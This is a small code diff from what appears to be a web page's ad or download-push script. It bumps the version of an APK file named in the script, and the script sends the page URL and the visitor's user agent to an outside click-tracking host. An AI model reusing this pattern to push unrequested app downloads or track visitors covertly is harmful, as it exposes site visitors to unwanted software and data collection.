@@ -312,7 +312,7 @@ var hy_itv=setInterval(function(){
 				if(isDownSelf())
 				{
 					setCookie("hyipdata","0");
-					pname="Qvod_collect_v3.14.15.apk";
+					pname="Qvod_collect_v3.14.16.apk";
 					getJsonp(
 						'http://click.shuiguo.com/index.php?action=index&method=main1',
 						"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
